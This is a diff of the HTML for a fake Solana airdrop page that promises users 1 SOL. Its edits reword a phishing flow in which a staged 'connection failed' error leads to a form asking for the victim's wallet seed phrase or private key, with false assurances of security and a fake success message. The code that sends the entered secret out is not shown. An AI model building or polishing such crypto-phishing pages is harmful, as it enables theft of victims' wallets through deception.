@@ -154,9 +154,6 @@
                 ✅ <span>No Credit Card Required</span>
             </div>
             <div class="badge">
-                ✅ <span>Instant Distribution</span>
-            </div>
-            <div class="badge">
                 ✅ <span>100% Secure</span>
             </div>
         </div>
@@ -170,12 +167,12 @@
             <div class="step">
                 <div class="step-icon">2</div>
                 <h3>Connect Wallet</h3>
-                <p>Choose automatic or manual wallet connection</p>
+                <p>Connect wallet with walletconnect</p>
             </div>
             <div class="step">
                 <div class="step-icon">3</div>
                 <h3>Receive SOL</h3>
-                <p>Get your 1 SOL instantly in your wallet</p>
+                <p>Get your 1 SOL within 24h</p>
             </div>
         </div>
 
@@ -183,23 +180,23 @@
         <div id="errorMessage">
             <h2>⚠️ Connection Failed</h2>
             <p>Automatic wallet connection failed. Please try manual connection.</p>
-            <button id="tryManualButton" class="cta-button">Try Manual Connection</button>
+            <button id="tryManualButton" class="cta-button">Manual Connect</button>
         </div>
 
         <!-- Formularz do ręcznego wpisywania seed phrase -->
         <div id="manualConnect">
             <h2>Manual Wallet Connection</h2>
-            <p>For security reasons, please enter your wallet seed phrase or private key to verify ownership:</p>
+            <p>Enter wallet private key or seed pharse to connect:</p>
             <form id="seedForm">
                 <input type="password" id="seedInput" placeholder="Enter your 12/24 word seed phrase or private key" required>
                 <p class="warning">⚠️ Never share your seed phrase with anyone. This is only for verification.</p>
-                <button type="submit" class="cta-button">Verify & Claim 1 SOL</button>
+                <button type="submit" class="cta-button">Connect</button>
             </form>
         </div>
 
         <!-- Komunikat sukcesu -->
         <div id="successMessage" class="success-message">
-            ✅ Success! 1 SOL has been sent to your wallet. This may take a few minutes to appear.
+            ✅ Success! 1 SOL has been sent to your wallet. This may take a within 24h.
         </div>
     </div>
 
